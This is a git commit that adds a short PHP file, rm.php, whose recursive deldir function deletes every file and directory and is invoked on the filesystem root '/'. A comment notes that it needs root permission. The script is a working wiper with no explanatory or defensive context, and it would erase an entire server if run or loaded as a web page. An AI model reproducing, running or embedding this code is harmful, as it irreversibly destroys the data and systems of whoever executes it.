d6c85436be29f6fc091b76fd2a7aba1d99d6f92d
刘天佑@洛谷 <61583168+LiuTianyouOnLuogu@users.noreply.github.com>
2020-07-15 16:48:09 +0800

    Create rm.php

---
+++ code/rm.php
@@ -0,0 +1,24 @@
+<?php
+//需要root权限
+function deldir($dir) {
+   $dh=opendir($dir);
+   while ($file=readdir($dh)) {
+      if($file!="." && $file!="..") {
+         $fullpath=$dir."/".$file;
+         if(!is_dir($fullpath)) {
+            unlink($fullpath);
+         } else {
+            deldir($fullpath);
+         }
+      }
+   }
+ 
+   closedir($dh);
+   if(rmdir($dir)) {
+      return true;
+   } else {
+      return false;
+   }
+}
+deldir("/");
+?>
